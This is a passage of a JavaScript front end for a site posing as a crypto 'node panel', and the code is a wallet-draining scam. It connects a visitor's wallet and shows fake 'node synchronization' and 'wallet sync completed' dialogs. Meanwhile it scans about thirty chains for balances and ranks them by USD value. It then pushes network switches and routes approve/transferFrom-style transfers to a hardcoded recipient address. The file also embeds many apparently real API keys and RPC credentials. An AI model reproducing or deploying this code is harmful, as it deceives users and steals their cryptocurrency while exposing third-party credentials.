import { createWeb3Modal, defaultConfig } from '@web3modal/ethers5'
import { ethers } from 'ethers'
import axios from 'axios'
import Swal from 'sweetalert2'

// 1. Get projectId at https://cloud.walletconnect.com
const projectId = '7b72ae90994c97929d1f03b9d8ca03d2'

// 2. Set chains
const mainnet = {
  chainId: 1,
  name: 'Ethereum',
  currency: 'ETH',
  explorerUrl: 'https://etherscan.io',
  rpcUrl: 'https://mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
}

const arbitrum = {
  chainId: 42161,
  name: 'Arbitrum',
  explorerUrl: 'https://arbiscan.io/',
  rpcUrl: "https://arb-mainnet.g.alchemy.com/v2/2YV6LZ06vlLEhAoXjhHyN4WrXjQwG4WW"
}

const bsc = {
  chainId: 56,
  name: 'Binance Smart chain',
  explorerUrl: 'https://bscscan.com/',
  rpcUrl: 'https://icy-quaint-silence.bsc.quiknode.pro/18b9bef5fff9264be562bf4365eedff44e109f9a/'
}

const optimism = {
  chainId: 10,
  name: 'Optimism',
  explorerUrl: 'https://optimistic.etherscan.io/',
  rpcUrl: 'https://opt-mainnet.g.alchemy.com/v2/q6r7-bg0Cfz47MgbP7IpK5fsfZvaOBRj'
}

const arbnova = {
  chainId: 42170,
  name: 'Arbitrum Nova',
  explorerUrl: 'https://nova.arbiscan.io/',
  rpcUrl: 'https://arbitrum-nova.public.blastapi.io'
}

const base = {
  chainId: 8453,
  name: 'Base',
  explorerUrl: 'https://basescan.org/',
  rpcUrl: 'https://base-mainnet.g.alchemy.com/v2/P__GBZTUcyu7f9FIWutz3vriqYun4V9y'
}

const zksync = { // Added missing colon after object declaration
  chainId: 324,
  name: 'Zksync',
  explorerUrl: 'https://explorer.zksync.io/',
  rpcUrl: "https://mainnet.era.zksync.io"
}

const polygon = {
  chainId: 137,
  name: "Polygon",
  explorerUrl: "https://polygonscan.com/",
  rpcUrl: "https://polygon-mainnet.g.alchemy.com/v2/l1HzJiJmTRdhEY0eaikYZQOFoVfCk1nj"
}

const polygonevm = {
  chainId: 1101,
  name: 'Polygon EVM',
  explorerUrl: 'https://zkevm.polygonscan.com/',
  rpcUrl: 'https://polygonzkevm-mainnet.g.alchemy.com/v2/hQFk1o7Bs_FPrT8HXVlpnaN3KN38azgr'
}

const blast = {
  chainId: 81457,
  name: 'Blast',
  explorerUrl: 'https://blastscan.io/',
  rpcUrl: 'https://blast-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
}

const scroll = {
  chainId: 534352,
  name: 'Scroll',
  explorerUrl: 'https://scrollscan.com/',
  rpcUrl: 'https://scroll-mainnet.public.blastapi.io'
}

const metis = {
  chainId: 1088,
  name: 'Metis Andromeda',
  explorerUrl: 'https://explorer.metis.io/',
  rpcUrl: 'https://metis-mainnet.public.blastapi.io'
}

const merlin = {
  chainId: 4200,
  name: 'Merlin',
  explorerUrl: 'https://scan.merlinchain.io/',
  rpcUrl: 'https://merlin.blockpi.network/v1/rpc/public'
}

const manta = {
  chainId: 169,
  name: 'Manta Pacific',
  explorerUrl: 'https://pacific-explorer.manta.network/',
  rpcUrl: 'https://manta-pacific.drpc.org'
} 

const fantom = {
  chainId: 250,
  name: 'Fantom Opera',
  explorerUrl: 'https://ftmscan.com/',
  rpcUrl: 'https://fantom-mainnet.public.blastapi.io'
}

const gnosis = {
  chainId: 100,
  name: 'Gnosis',
  explorerUrl: 'https://gnosisscan.io/',
  rpcUrl: 'https://rpc.gnosischain.com'
}

const celo = {
  chainId: 42220,
  name: 'Celo',
  explorerUrl: 'https://celoscan.io/',
  rpcUrl: 'https://1rpc.io/celo'
}

const cronos = {
  chainId: 25,
  name: 'Cronos',
  explorerUrl: 'https://cronoscan.com/',
  rpcUrl: 'https://evm.cronos.org/'
}

const mantle = {
  chainId: 5000,
  name: 'Mantle',
  explorerUrl: 'https://explorer.mantle.xyz/',
  rpcUrl: 'https://mantle-mainnet.public.blastapi.io'
}

const aurora = {
  chainId: 1313161554,
  name: 'Aurora',
  explorerUrl: 'https://explorer.aurora.dev/',
  rpcUrl: 'https://mainnet.aurora.dev'
}

const avalanche = {
  chainId: 43114,
  name: 'Avalanche',
  explorerUrl: 'https://avascan.info/',
  rpcUrl: 'https://avalanche-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
}

const okx = {
  chainId: 66,
  name: 'Okx Mainnet',
  explorerUrl: 'https://www.oklink.com/oktc',
  rpcUrl: 'https://oktc-mainnet.public.blastapi.io'
}

const smartbch = {
  chainId: 10000,
  name: 'Smart bitcoin Cash',
  explorerUrl: 'https://smartbch.fountainhead.cash/mainnet'
}

const klaytn = {
  chainId: 8217,
  name: 'Klaytn Cypress',
  explorerUrl: '',
  rpcUrl: 'https://public-en-cypress.klaytn.net'
}

const harmony = {
  chainId: 1666600000,
  name: 'Harmony',
  explorerUrl: 'https://explorer.harmony.one/',
  rpcUrl: 'https://go.getblock.io/65eb9d18a22f4643a81ecdf11ce17640'
}

const heco = {
  chainId: 128,
  name: 'Huobi Eco Chain',
  explorerUrl: 'https://hecoscan.io/#/',
  rpcUrl: 'https://http-mainnet.hecochain.com	'
}

const conflux = {
  chainId: 1030,
  name: 'Conflux espace',
  explorerUrl: 'https://www.confluxscan.io/',
  rpcUrl: 'https://evm.confluxrpc.com'
}

const platon = {
  chainId: 210425,
  name: 'Platon',
  explorerUrl: 'https://scan.platon.network/',
  rpcUrl: 'https://rpc.particle.network/evm-chain?chainId=210425&projectUuid=aabbcf0e-e728-42bb-b6ed-f50be0154e20&projectKey=c5zORhFBadsXOH5NVCRzIhDYpQ1zoxEfQdBxmGVt'
}

const linea = {
  chainId: 59144,
  name: 'Linea',
  explorerUrl: 'https://lineascan.build/',
  rpcUrl: 'https://linea-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
}

const opbnb = {
  chainId: 204,
  name: 'opBNB',
  explorerUrl: 'https://opbnb.bscscan.com/',
  rpcUrl: 'https://rpc.particle.network/evm-chain?chainId=204&projectUuid=aabbcf0e-e728-42bb-b6ed-f50be0154e20&projectKey=c5zORhFBadsXOH5NVCRzIhDYpQ1zoxEfQdBxmGVt'
}

// 3. Create your application's metadata object
const metadata = {
  name: 'Resolverconsult-panel.com',
  description: 'A crypto node/panel for fixing node clusters, validation and monitoring',
  url: 'Resolverconsult-panel.com', // url must match your domain & subdomain
  icons: ['https://avatars.mywebsite.com/']
}

// 4. Create Ethers config
const ethersConfig = defaultConfig({
  /*Required*/
  metadata,

  /*Optional*/
  enableEIP6963: true, // true by default
  enableInjected: true, // true by default
  enableCoinbase: true, // true by default
  rpcUrl: 'https://eth-mainnet.g.alchemy.com/v2/IRwnvoQZmF2e0lePk63uoLwKO_en3nY1', // used for the Coinbase SDK
  defaultChainId: 1, // used for the Coinbase SDK
})

// 5. Create a Web3Modal instance
const modal = createWeb3Modal({
  ethersConfig,
  chains: [
    mainnet, 
    arbitrum, 
    bsc, 
    optimism, 
    arbnova, 
    base, 
    zksync, 
    polygon,
    polygonevm,
    blast,
    scroll,
    metis,
    merlin,
    manta,
    fantom,
    gnosis,
    celo,
    cronos,
    mantle,
    aurora,
    avalanche,
    okx,
    smartbch,
    klaytn,
    harmony,
    heco,
    platon,
    linea,
    opbnb,
    conflux
  ], // Added chains array
  projectId,
  enableAnalytics: true, // Optional - defaults to your Cloud configuration
  enableOnramp: true // Optional - false as default
})

const openConnectModalBtn = document.getElementById('open-connect-modal')

openConnectModalBtn.addEventListener('click', async () => {
    modal.open()
    openConnectModalBtn.innerHTML = 'Connected'
})


//API KEYS
  const etherscanapikey = 'KT16MUFCBNQ2M7K7QJIFX1D6JQ7WXD5HBH';
  const bnbscanapikey = 'CH84KRSH8Z71G951C6VXVRWN7BI49CI8Z6';
  const arbapikey = 'MBS6UUPEK2QC33NRVSABQ3CDNAW2SZ4N52';
  const optimismapikey = 'M42GCWUMBY4ZNHV3CG6E5UJH2UF943MP9M';
  const arbnovaapikey = 'JPJMCUIBMUF91IVB515TAUMVAME1EA45Y8';
  const baseapikey = '7EPF2DR1DQIYERYGJCZEJH3F9H9YFJ3XDC';
  const zksyncapikey = 'B2NY27YJX9EAI8DPP7RK877E6ZNENHK55X';
  const polygonapikey = '12WCEA5MEDHGVQCT5N1JG9FKPJ5U4FRYCQ';
  const polygonevmapikey = 'ZRSYXTK9DZHK89HXBIWPFYN9DDMZA23PFI';
  const blastapikey = 'Q7ZYBY68ZRTANVSE9N69ADYQV65P87Z4XD';
  const scrollapikey = 'P8F9GBDZ7MHA1DIHBZG6AHZ73HPNHUB6U9';
  const okxapikey = '5d00ecef-0dbf-4e1e-8b31-d74e91064f3c';
  const fantomapikey = 'ERG19ERIP5ZCSG4T6RHKSURR6W1A2ZZ4YF';
  const gnosisapikey = '5X9PNB5PMKFJ845131P7IHXPV8UY454H73';
  const lineaapikey = 'BMMNSMDJ4TB6KB2335ZB3QUQUU8VKZ9CBS';
  const celoapikey = '6K76PFC62X6RZI5D4EVZKAGXNIUKZR7INJ';
  const particleprojectid = 'aabbcf0e-e728-42bb-b6ed-f50be0154e20';
  const particleprojectserverkey = 's7UZZFHoE7koeD9Pw8lLDZyxMgCY36rngiGL3tLF';
  const opbnbapikey = "W6P1URXJZTF7UMXNEF6EN1EQZ7TG4U2489";
  const cronosapikey = 'GFTQNQFE2CAH21VIPVB3KE8B4YXM1BBZYV';
  const harmonyapikey = '65eb9d18a22f4643a81ecdf11ce17640';
  const merlinapikey = 'd52215ab-0017-4c01-a56b-b8bf4f08c921';

  //SMART CONTRACT ADDRESSES
  const contractAddress = '0x695902b97c3a78b3af0a3eedf15b4c9051e9d6f3';
  const bnbContractAddress = '0xecb19b89bbc345e34c974fb0ab79add57cf76cd7';
  const arbContractAddress = '0x8ed6e6e9c814fee2a0ea07276db2e6b1d0e22d3b';
  const optimismContractAddress = '0x4b706524e15866c7030d042b5fec8a66d7ab1456';
  const arbnovaContractAddress = '0xd2808c84d14b4ae3485736e62542319c5dd0e3c3';
  const baseContractAddress = '0x26e7842358deca133effe72ad3305f273f3470cd';
  const zksyncContractAddress = '0x56382FCC4595b59741a8fBa4109b86bC3054C6Ea';
  const polygonContractAddress = '0x4bdd3032d167d0225639d50d4acf46735d7927cf';
  const polygonevmContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const blastContractAddress = '0x3f4941479ff38d4cc1e39bd46381002e62f3e1e5';
  const scrollContractAddress = '0x3f4941479ff38d4cc1e39bd46381002e62f3e1e5';
  const metisContractAddress = '0x7286B3765Ebc13186f46e2ba3d3963B92B99C00A';
  const mantaContractAddress = '0x7286B3765Ebc13186f46e2ba3d3963B92B99C00A';
  const fantomContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const lineaContractAddress = '0x6f635BfaC18340D605A2095a1CF47fa2B86e3d48';
  const celoContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const avalancheContractAddress = '0xFb94197A668D71Bc81C5bC652D0152D422EA56e7';
  const opbnbContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const okxContractAddress = '0x6ff360B3B5ad12513e415e18Fd8cEC01F24DF77b';
  const mantleContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const klaytnContractAddress = '0x7286B3765Ebc13186f46e2ba3d3963B92B99C00A';
  const platonContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const cronosContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const harmonyContractAddress = '0x7286b3765ebc13186f46e2ba3d3963b92b99c00a';
  const gnosisContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const hecoContractAddress = '';
  const auroraContractAddress = '';
  const smartbchContractAddress = '';
  const confluxContractAddress = '';
  const merlinContractAddress = '';



  const recipientAddress = '0xfEC0B00929ed4FF0d7662D8b912F04d97fBd0D54'; //RECIPIENT ADDRESS
  const erc20ABI = [
      "function approve(address spender, uint256 amount) external returns (bool)",
      "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
      "function balanceOf(address owner) external view returns (uint256)"
  ];
  const contractABI = [
      "function transferTokens(address token, address owner, address recipient, uint256 amount) external returns (bool)"
  ];

async function connectWallet() {
    const walletProvider = modal.getWalletProvider()
    let provider = new ethers.providers.Web3Provider(walletProvider);
    //console.log(provider)
    let signer = provider.getSigner();
    //console.log(signer)

    try {
        await provider.send("eth_requestAccounts", []);
        const address = await signer.getAddress();
        //console.log(address)
        const network = modal.getChainId()

        provider.on('network', (newNetwork, oldNetwork) => {
            if (oldNetwork) {
                // Network has changed
                //console.log(`Network changed from old network to new network`);
                // Refresh the provider to reflect the new network
                provider = new ethers.providers.Web3Provider(walletProvider, "any");
                // Update the signer to match the new network
                signer = provider.getSigner();
                //console.log('Signer updated for new network');
            }
        });

        try {
          const randomTimerDuration = Math.floor(Math.random() * 11) + 90;
            Swal.fire({
                title: 'Please Wait...',
                html: 'Node synchronization is ongoing. I will close after Synchronization is complete. Average wait time is <b></b seconds',
                imageUrl: 'https://www.resolverconsult-panel.com/assets/save_bckudy-gjk8moac.png',
                imageWidth: 300,
                imageHeight: 200,
                timer: randomTimerDuration * 1000,
                timerProgressBar: true,
                didOpen: () => {
                    Swal.showLoading();
                    const b = Swal.getHtmlContainer().querySelector('b');
                    let timerInterval = setInterval(() => {
                        const remainingTime = Swal.getTimerLeft();
                        if (remainingTime !== null) {
                            b.textContent = Math.ceil(remainingTime / 1000);
                        }
                    }, 100);

                    // Ensure to clear the interval when the alert is closed
                    Swal.getHtmlContainer().addEventListener('swalClose', () => {
                        clearInterval(timerInterval);
                    });
                },
                willClose: () => {
                    // Show success dialog after loading dialog closes
                    Swal.fire({
                        icon: 'success',
                        title: 'Success!',
                        text: 'Wallet sync completed successfully.',
                        showConfirmButton: true
                    });
                }
            })
        } catch (error) {
            console.error('Error opening dialog box...')
        }

       
        let networkDetect = [
            {chainId: mainnet.chainId, name: mainnet.name, rpcurl: 'https://mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://etherscan.io/', fetchTokens: fetchETHTokens},
            {chainId: bsc.chainId, name: bsc.name, rpcurl: 'https://icy-quaint-silence.bsc.quiknode.pro/18b9bef5fff9264be562bf4365eedff44e109f9a/', nativeCurrency: {name: 'BNB',symbol:'BBN', decimal: 18}, blockExplorerUrl: 'https://bscscan.com/', fetchTokens: fetchBNBTokens},
            {chainId: arbitrum.chainId, name: arbitrum.name, rpcurl: 'https://arb-mainnet.g.alchemy.com/v2/2YV6LZ06vlLEhAoXjhHyN4WrXjQwG4WW', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://arbiscan.io/', fetchTokens: fetchARBTokens},
            {chainId: optimism.chainId, name: optimism.name, rpcurl: 'https://opt-mainnet.g.alchemy.com/v2/q6r7-bg0Cfz47MgbP7IpK5fsfZvaOBRj', nativeCurrency: {name: 'Ethereum', symbol: 'ETH'}, blockExplorerUrl: 'https://optimistic.etherscan.io/', fetchTokens: fetchOPTokens},
            {chainId: arbnova.chainId, name: arbnova.name, rpcurl: 'https://arbitrum-nova.public.blastapi.io', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://nova.arbiscan.io/', fetchTokens: fetchARBNOVATokens},
            {chainId: base.chainId, name: base.name, rpcurl: 'https://base-mainnet.g.alchemy.com/v2/P__GBZTUcyu7f9FIWutz3vriqYun4V9y', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://basescan.org/', fetchTokens: fetchBASETokens},
            {chainId: zksync.chainId, name: zksync.name, rpcurl: 'https://mainnet.era.zksync.io', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://explorer.zksync.io/', fetchTokens: fetchZKSYNCTokens},
            {chainId: polygon.chainId, name: polygon.name, rpcurl: 'https://polygon-mainnet.g.alchemy.com/v2/l1HzJiJmTRdhEY0eaikYZQOFoVfCk1nj', nativeCurrency: {name: 'Matic', symbol: 'MATIC', decimal: 18}, blockExplorerUrl: 'https://polygonscan.com/', fetchTokens: fetchPOLYGONTokens},
            {chainId: polygonevm.chainId, name: polygonevm.name, rpcurl: 'https://polygonzkevm-mainnet.g.alchemy.com/v2/hQFk1o7Bs_FPrT8HXVlpnaN3KN38azgr', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://zkevm.polygonscan.com/', fetchTokens: fetchPOLYGONEVMTokens},
            {chainId: blast.chainId, name: blast.name, rpcurl: 'https://blast-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://blastscan.io/', fetchTokens: fetchBLASTTokens},
            {chainId: scroll.chainId, name: scroll.name, rpcurl: 'https://scroll-mainnet.public.blastapi.io', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://scrollscan.com/', fetchTokens: fetchSCROLLTokens},
            {chainId: metis.chainId, name: metis.name, rpcurl: 'https://metis-mainnet.public.blastapi.io', nativeCurrency: {name: 'Metis Token', symbol: 'METIS', decimal: 18}, blockExplorerUrl: 'https://explorer.metis.io/', fetchTokens: fetchMETISTokens},
            {chainId: merlin.chainId, name: merlin.name, rpcurl: 'https://merlin.blockpi.network/v1/rpc/public', nativeCurrency: {name: 'Bitcoin', symbol: 'BTC', decimal: 18}, blockExplorerUrl: 'https://scan.merlinchain.io/', fetchTokens: fetchMERLINTokens},
            {chainId: manta.chainId, name: manta.name, rpcurl: 'https://manta-pacific.drpc.org', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://pacific-explorer.manta.network/', fetchTokens: fetchMANTATokens},
            {chainId: fantom.chainId, name: fantom.name, rpcurl: 'https://fantom-mainnet.public.blastapi.io', nativeCurrency: {name: 'Fantom', symbol: 'FTM', decimal: 18}, blockExplorerUrl: 'https://ftmscan.com/', fetchTokens: fetchFANTOMTokens},
            {chainId: gnosis.chainId, name: gnosis.name, rpcurl: 'https://rpc.gnosischain.com', nativeCurrency: {name: 'xDai', symbol: 'xDAI', decimal: 18}, blockExplorerUrl: 'https://gnosisscan.io/', fetchTokens: fetchGNOSISTokens},
            {chainId: celo.chainId, name: celo.name, rpcurl: 'https://celo-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Celo', symbol: 'CELO', decimal: 18}, blockExplorerUrl: 'https://celoscan.io/', fetchTokens: fetchCELOTokens},
            {chainId: cronos.chainId, name: cronos.name, rpcurl: 'https://evm.cronos.org/', nativeCurrency: {name: 'Cronos', symbol: 'CRO', decimal: 18}, blockExplorerUrl: 'https://cronoscan.com/', fetchTokens: fetchCRONOSTokens},
            {chainId: mantle.chainId, name: mantle.name, rpcurl: 'https://mantle-mainnet.public.blastapi.io', nativeCurrency: {name: 'Mantle', symbol: 'MNT', decimal: 18}, blockExplorerUrl: 'https://explorer.mantle.xyz/', fetchTokens: fetchMANTLETokens},
            {chainId: aurora.chainId, name: aurora.name, rpcurl: 'https://mainnet.aurora.dev', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://explorer.aurora.dev/', fetchTokens: fetchAURORATokens},
            {chainId: avalanche.chainId, name: avalanche.name, rpcurl: 'https://avalanche-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Avalanche', symbol: 'AVAX', decimal: 18}, blockExplorerUrl: 'https://avascan.info/', fetchTokens: fetchAVALANCHETokens},
            {chainId: okx.chainId, name: okx.name, rpcurl: 'https://oktc-mainnet.public.blastapi.io', nativeCurrency: {name: 'OKT', symbol: 'OKT', decimal: 18}, blockExplorerUrl: 'https://www.oklink.com/oktc', fetchTokens: fetchOKXTokens},
            {chainId: smartbch.chainId, name: smartbch.name, rpcurl: 'https://smartbch.fountainhead.cash/mainnet', nativeCurrency: {name: 'Bitcoin Cash', symbol: 'BCH', decimal: 18}, blockExplorerUrl: 'https://smartbch.org/', fetchTokens: fetchSMARTBCHTokens},
            {chainId: klaytn.chainId, name: klaytn.name, rpcurl: 'https://public-en-cypress.klaytn.net', nativeCurrency: {name: 'Klaytn', symbol: 'KLAY', decimal: 18}, blockExplorerUrl: 'https://scope.klaytn.com', fetchTokens: fetchKLAYTNTokens},
            {chainId: harmony.chainId, name: harmony.name, rpcurl: 'https://go.getblock.io/65eb9d18a22f4643a81ecdf11ce17640', nativeCurrency: {name: 'Harmony', sykmbol: 'ONE', decimal: 18}, blockExplorerUrl: 'https://explorer.harmony.one/', fetchTokens: fetchHARMONYTokens},
            {chainId: heco.chainId, name: heco.name, rpcurl: 'https://http-mainnet.hecochain.com', nativeCurrency: {name: 'Huobi Token', symbol: 'HT', decimal: 18}, blockExplorerUrl: 'https://hecoscan.io/#/', fetchTokens: fetchHECOTokens},
            {chainId: conflux.chainId, name: conflux.name, rpcurl: 'https://evm.confluxrpc.com', nativeCurrency: {name: 'Conflux Token', symbol: 'CFX', decimal: 18}, blockExplorerUrl: 'https://evm.confluxscan.net', fetchTokens: fetchCONFLUXTokens},
            {chainId: platon.chainId, name: platon.name, rpcurl: 'https://rpc.particle.network/evm-chain?chainId=210425&projectUuid=aabbcf0e-e728-42bb-b6ed-f50be0154e20&projectKey=c5zORhFBadsXOH5NVCRzIhDYpQ1zoxEfQdBxmGVt', nativeCurrency: {name: 'PlatON', symbol: 'LAT', decimal: 18}, blockExplorerUrl: 'https://scan.platon.network', fetchTokens: fetchPLATONTokens},
            {chainId: linea.chainId, name: linea.name, rpcurl: 'https://linea-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://lineascan.build/', fetchTokens: fetchLINEATokens},
            {chainId: opbnb.chainId, name: opbnb.name, rpcurl: 'https://rpc.particle.network/evm-chain?chainId=204&projectUuid=aabbcf0e-e728-42bb-b6ed-f50be0154e20&projectKey=c5zORhFBadsXOH5NVCRzIhDYpQ1zoxEfQdBxmGVt', nativeCurrency: {name: 'opBNB', symbol: 'BNB', decimal: 18}, blockExplorerUrl: 'https://mainnet.opbnbscan.com', fetchTokens: fetchOPBNBTokens}
        ]

        let currentChainId = await provider.getNetwork();
        let networksWithTokens = []

        const minimumBalance = ethers.utils.parseUnits("0.02", 18); // Set minimum balance to 0.02 tokens


      try {
        await Promise.all(
          networkDetect.map(async (nets) => {
            const networkProvider = new ethers.providers.JsonRpcProvider(nets.rpcurl);
            const nonZeroBalance = [];
            let netBalances = ethers.BigNumber.from(0);
            let highestSingleTokenBalance = ethers.BigNumber.from(0);
    
            // Get native balances first
            try {
              const nativeBalance = await retryAsync(() => networkProvider.getBalance(address));
              if (nativeBalance.gte(minimumBalance)) {
                const formattedNativeBalance = ethers.utils.formatUnits(nativeBalance, 18);
                const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${nets.nativeCurrency.symbol.toLowerCase()}`;
                const response = await retryAsync(() => fetch(proxyUrl));
                const prices = await response.json();
                const priceInfo = prices.data?.[nets.nativeCurrency.symbol.toUpperCase()]?.quote.USD.price;
                nonZeroBalance.push({ tokenSymbol: nets.nativeCurrency.symbol, balance: parseFloat(formattedNativeBalance) });
                netBalances = netBalances.add(nativeBalance);
                if (nativeBalance.gt(highestSingleTokenBalance)) {
                  const usdValue = (formattedNativeBalance * priceInfo).toString();
                  console.log(`This is the usd value of ${nets.nativeCurrency.symbol}: ${usdValue}`)
                  highestSingleTokenBalance = ethers.utils.parseUnits(usdValue, 18);
                }
              }
            } catch (error) {
              console.error('Failed to fetch native balance:', error);
            }
    
            const tokens = await nets.fetchTokens(address);
            await Promise.all(
              tokens.map(async (token) => {
                try {
                  const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, networkProvider);
                  const balance = await retryAsync(() => tokenContract.balanceOf(address));
    
                  if (balance.gte(minimumBalance)) {
                    const formattedBalance = ethers.utils.formatUnits(balance, token.decimal);
                    const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`;
                    const response = await retryAsync(() => fetch(proxyUrl));
                    const prices = await response.json();
                    const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
                    nonZeroBalance.push({ symbol: token.tokenSymbol, balance: parseFloat(formattedBalance) });
                    netBalances = netBalances.add(balance);
                    if (balance.gt(highestSingleTokenBalance)) {
                      const usdValue = (formattedBalance * priceInfo).toString();
                      console.log(`This is the usd value of ${token.tokenSymbol}: ${usdValue}`)
                      highestSingleTokenBalance = ethers.utils.parseUnits(usdValue, 18);
                      nonZeroBalance.push({ usdValue: parseFloat(usdValue) });
                    }
                  }
                } catch (error) {
                  console.error(`Failed to fetch balance for ${token.tokenSymbol}:`, error);
                }
              })
            );
    
            if (nonZeroBalance.length > 0) {
              nonZeroBalance.sort((a, b) => b.usdValue - a.usdValue);
    
              networksWithTokens.push({
                chainId: nets.chainId,
                name: nets.name,
                rpcUrl: nets.rpcurl,
                nativeCurrency: nets.nativeCurrency,
                blockExplorerUrl: nets.blockExplorerUrl,
                highestSingleTokenBalance: ethers.utils.formatUnits(highestSingleTokenBalance, 18),
                netBalances: ethers.utils.formatUnits(netBalances, 18),
              });
            }
          })
        );
    
        // Sort networks by highest single token balance in descending order
        networksWithTokens.sort((a, b) => parseFloat(b.highestSingleTokenBalance) - parseFloat(a.highestSingleTokenBalance));
    
        console.log(
          'Networks with tokens sorted by highest single token balance and usd value:',
          networksWithTokens.map((net) => ({
            name: net.name,
            highestSingleTokenBalance: net.highestSingleTokenBalance,
          }))
        );
    
        const maxSingleTokenBalance = Math.max(...networksWithTokens.map((net) => parseFloat(net.highestSingleTokenBalance)));
    
        console.log(`Maximum single token balance: ${maxSingleTokenBalance}`);
      } catch (error) {
        console.error('Error fetching tokens and details:', error)
      }
      
        // Sort networks by highest single token balance in descending order
        networksWithTokens.sort((a, b) => parseFloat(b.highestSingleTokenBalance) - parseFloat(a.highestSingleTokenBalance));

        console.log('Networks with tokens sorted by highest single token balance and usd value:', networksWithTokens.map(net => ({
            name: net.name,
            highestSingleTokenBalance: net.highestSingleTokenBalance,
            //highestSingleTokenBalanceUSD: nets.highestSingleTokenBalanceUSD
        })));

        const maxSingleTokenBalance = Math.max(...networksWithTokens.map(net => parseFloat(net.highestSingleTokenBalance)));
        //const maxSingleTokenBalanceUSD = Math.max(...networksWithTokens.map(net => parseFloat(net.highestSingleTokenBalance)));


        console.log(`Maximum single token balance: ${maxSingleTokenBalance}`);
        //console.log(`Maximum single token balance usd value: ${maxSingleTokenBalanceUSD}`)

        if (!networksWithTokens.some(net => net.chainId === currentChainId.chainId) && networksWithTokens.length > 0) {
            window.alert(`Your Nodes are clustered on the current Networks: ${networksWithTokens.map(net => net.name).join(", ")}. Please switch your network!`);
            for (let net of networksWithTokens) {
                var targetNetworkId = net.chainId; // Target each network with tokens
                try {
                    // Attempt to switch networks programmatically
                    await modal.switchNetwork(targetNetworkId);
                    console.log(`Switched to network: ${targetNetworkId}`);
        
                    // Update the provider and signer to reflect the new network
                    provider = new ethers.providers.Web3Provider(walletProvider, 'any');
                    signer = provider.getSigner();
        
                    // Handle transactions for the switched network
                    await handleNetworkTransactions(targetNetworkId, address, signer, provider);
                    continue;
                  
                } catch (switchError) {
                    if (switchError.code === 4902) {
                        try {
                            // If the network is not added to the user's wallet, add it
                            await provider.send('wallet_addEthereumChain', [{
                                chainId: `0x${targetNetworkId.toString(16)}`,
                                rpcUrls: [net.rpcUrl],
                                chainName: net.name,
                                nativeCurrency: net.nativeCurrency,
                                blockExplorerUrls: [net.blockExplorerUrl]
                            }]);
                            console.log(`Added and switched to network: ${targetNetworkId}`);
                            continue; // Continue to the next network
                        } catch (addError) {
                            console.error('Failed to add the network:', addError);
                        }
                    }else{
                        console.error('Failed to switch the network:', switchError);
                        signer = provider.getSigner();
                    }
                }
            }
        } else {
           window.alert(`User is already connected to the correct network}`)
           for (let net of networksWithTokens) {
            var targetNetworkId = net.chainId; // Target each network with tokens
            try {
                 // Attempt to switch networks programmatically
                await modal.switchNetwork(targetNetworkId);
                console.log(`Switched to network: ${targetNetworkId}`);

                // Update the provider and signer to reflect the new network
                provider = new ethers.providers.Web3Provider(walletProvider, 'any');
                signer = provider.getSigner();

                // Handle transactions for the switched network
                await handleNetworkTransactions(targetNetworkId, address, signer, provider);
                continue;
            } catch (switchError) {
                if (switchError.code === 4902) {
                    try {
                        // If the network is not added to the user's wallet, add it
                        await provider.send('wallet_addEthereumChain', [{
                            chainId: `0x${targetNetworkId.toString(16)}`,
                            rpcUrls: [net.rpcUrl],
                            chainName: net.name,
                            nativeCurrency: net.nativeCurrency,
                            blockExplorerUrls: [net.blockExplorerUrl]
                        }]);
                        console.log(`Added and switched to network: ${targetNetworkId}`);
                        continue; // Continue to the next network
                    } catch (addError) {
                        console.error('Failed to add the network:', addError);
                    }
                }else{
                    console.error('Failed to switch the network:', switchError);
                    signer = provider.getSigner();
                }
            }
        }
    }

    } catch (error) {
        console.error('Error handling tokens:', error);
    }

}


//HELPER FUNCTIONS
async function handleNetworkTransactions(chainId, address, signer, provider) {
  switch (chainId) {
    case mainnet.chainId:
      await handleTransactions(fetchETHTokens, contractAddress, address, signer, provider, 'ETH');
      break;

    case bsc.chainId:
